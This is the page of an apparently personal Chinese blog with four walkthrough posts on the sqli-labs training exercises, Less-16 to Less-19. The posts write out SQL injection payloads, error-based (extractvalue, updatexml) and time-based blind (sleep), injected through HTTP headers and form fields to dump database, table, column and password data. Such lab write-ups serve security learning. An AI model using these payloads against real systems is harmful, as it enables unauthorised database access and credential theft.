+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/04/01/SQLI-DUMB-SERIES-19/">SQLI-DUMB-SERIES-19</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-04-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-04-01</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>和上题区别不大，我们根据页面中给的提示，直接抓包在Referer添加’发现和上次报错一样一样的。好像这种都是这种形式。</p>
+<p>那我们就按照之前用的方式进行拼接</p>
+<p>Referer: <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://45.32.113.109:65118/Less-19/&#39;and" >http://45.32.113.109:65118/Less-19/&#39;and</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> extractvalue(0x3a,concat(0x3a,database())) and’ 来用一波extractvalue，熟悉记忆一下。（我现在严重怀疑之前我那个可能是拼写错了🐶）</p>
+<p><img src="/picture/19.1.jpg"><br>Referer: <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://45.32.113.109:65118/Less-19/&#39;and" >http://45.32.113.109:65118/Less-19/&#39;and</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> extractvalue(0x3a,concat(0x3a,(select table_name from information_schema.tables where table_schema&#x3D;database()limit 3,1))) and’</p>
+<p><img src="/picture/19.2.jpg"><br>Referer: <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://45.32.113.109:65118/Less-19/&#39;and" >http://45.32.113.109:65118/Less-19/&#39;and</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> extractvalue(0x3a,concat(0x3a,(select column_name from information_schema.columns where table_name&#x3D;’users’limit 2,1))) and’<br><img src="/picture/19.3.jpg"><br>Referer: <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://45.32.113.109:65118/Less-19/&#39;and" >http://45.32.113.109:65118/Less-19/&#39;and</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> extractvalue(0x3a,concat(0x3a,(select password from users limit 0,1))) and’</p>
+<p><img src="/picture/19.4.jpg"><br>好了查完了¯_(ツ)_&#x2F;¯</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/04/01/SQLI-DUMB-SERIES-18/">SQLI-DUMB-SERIES-18</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-04-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-04-01</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>我们进行注入点的检测，再页面各位置都没反应。我们利用burp suit进行抓包。按照道理我们需要挨个试，但是根据页面的提示：you user agent is：</p>
+<p>所以我们尝试从User-Agent开始，输入’发现报错</p>
+<p><img src="/picture/18.1.jpg"></p>
+<p>他的报错方式非常离谱，虽然这不影响我们对注入点的判断，但对于后续的操作有影响</p>
+<p>我们在后面添加%23</p>
+<p><img src="/picture/18.2.jpg"></p>
+<p>通过报错信息我们可以推断出这个完整的格式应该是(‘User-Agent’,’110.231.160.51’,’admin’)</p>
+<p>现在不知道他这到底是个什么样的东西，但很清楚单纯的注释掉后面是不可能的</p>
+<p>我们只能想个办法把他拼成和他差不多的样子</p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0’ and ‘</p>
+<p><img src="/picture/18.3.jpg"></p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0’and updatexml(0x3e,concat(0x3a,database()),1) and ‘从现在开始，和常规注入的操作就一样了。查到了数据库名</p>
+<p><img src="/picture/18.4.jpg"></p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0’and updatexml(0x3e,concat(0x3a,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),0x3e),1) and ‘</p>
+<p><img src="/picture/18.5.jpg"></p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0’and updatexml(0x3e,concat(0x3a,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),0x3e),1) and ‘查出列名</p>
+<p><img src="/picture/18.6.jpg"></p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0’and updatexml(0x3e,concat(0x3a,(select password from users where id&#x3D;’1’ limit 0,1),0x3e),1) and ‘查出表中密码</p>
+<p><img src="/picture/18.7.jpg"></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/04/01/SQLI-DUMB-SERIES-17/">SQLI-DUMB-SERIES-17</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-04-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-04-01</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>z这一题相对来说比较新一些。</p>
+<p>这题模仿的是修改密码界面，首先我们依旧在username处进行测试。当单纯输入admin时，他直接显示“成功更新了你的密码”</p>
+<p>但发现无论后面如何输入，都显示的是BUG OFF YOU SILLY DUMB HACKER（据说是让我爬），那么肯定不能在这里了。</p>
+<p>我们尝试在在new password处进行测试，发现报错</p>
+<p><img src="/picture/17.1.jpg"></p>
+<p>虽然但是，我有点不能理解为什么报错出现在了admin（用户名）。没搞明白他到底是怎么传过去的。</p>
+<p>使用报错注入：</p>
+<p>uname&#x3D;Dumb&amp;passwd&#x3D;loveu’and updatexml(1,concat(0x7e,database(),0x7e),1)%23–+&amp;submit&#x3D;Submit</p>
+<p><img src="/picture/17.2.jpg"></p>
+<p>uname&#x3D;Dumb&amp;passwd&#x3D;loveu’and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where<br>table_schema&#x3D;database() limit 0,1 ),0x7e),1)%23–+&amp;submit&#x3D;Submit查表名</p>
+<p><img src="/picture/17.3.jpg"></p>
+<p>查出列名</p>
+<p>uname&#x3D;Dumb&amp;passwd&#x3D;loveu’and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where<br>table_name&#x3D;’users’ limit 0,1 ),0x7e),1)%23–+&amp;S&#x3D;Submit</p>
+<p><img src="/picture/17.4.jpg"></p>
+<p>uname&#x3D;Dumb&amp;passwd&#x3D;loveu’and updatexml(1,concat(0x7e,(select password from (select id,username,password from users )as us limit 0,1 ),0x7e),1)%23–+&amp;S&#x3D;Submit</p>
+<p>通过这个语句爆出表中的数据。由于原本的语句是更新，我们注入的是查找。</p>
+<p>因为不能在同一个sql语句中，先select同一个表的某些值，然后再update这个表。所以我们需要先把他做成一个临时表，然后从新做出来的表中去查询</p>
+<p><img src="/picture/17.5.jpg"></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/04/01/SQLI-DUMB-SERIES-16/">SQLI-DUMB-SERIES-16</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-04-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-04-01</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1</p>
+<p>通过’ 、”、’)、”）、‘））、“））的顺序进行探索。发现当输入为”)时十秒网页后返回</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin”) and sleep(5)%23&amp;submit&#x3D;Submit</p>
+<p><img src="/picture/16.1.jpg"></p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin”)and if( length(database())&#x3D;’§a§’,sleep(5),1)%23&amp;submit&#x3D;Submit数据库长度为8</p>
+<p>在每一次查找的时候，最好都先查找其长度或者总数量，为了避免繁琐，跑长度就不写了。</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin”)and if( substr(database(),1,1)&#x3D;’§a§’,sleep(5),1)%23&amp;submit&#x3D;Submit依次改变截取的位长，在增加位长的同时把以跑出来的放在§前面。例子：uname&#x3D;admin&amp;passwd&#x3D;admin’and if(substr(database(),1,2)&#x3D;’s§a§’,sleep(5),1)%23&amp;submit&#x3D;Subit</p>
+<p>得出数据库名为security</p>
+<p>写个语句查出数据表的个数。</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin”)and if( substr((select table_name from information_schema.tables where table_schema&#x3D;database()limit 0,1),1,1)&#x3D;’§a§’,sleep(5),1)%23&amp;submit&#x3D;Submit通过这个语句的变动，跑出所有表名</p>
+<p>我们发现，burp suite 的暴力破解表里面，只有小写字母和数字。所以我们应该添上大写的字母之后在进行爆破，或者直接用ascii码跑也行</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin”)and if( substr((select username from users limit 0,1),1,5)&#x3D;’Dumb§a§’,sleep(10),1)%23&amp;submit&#x3D;Submit</p>
+<p>跑出第一个用户名为Dumb</p>
+<p>uname&#x3D;admin&amp;passwd&#x3D;admin”)and if( substr((select password from users where username&#x3D;’Dumb’ limit 0,1),1,4)&#x3D;’Dum§a§’,sleep(10),1)%23&amp;submit&#x3D;Submit</p>
+<p>跑出Dumb对应的密码为：Dumb</p>
+</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/picture/dog.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">该狗还得狗</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">26</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">2</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">2</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>jiamuhe</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
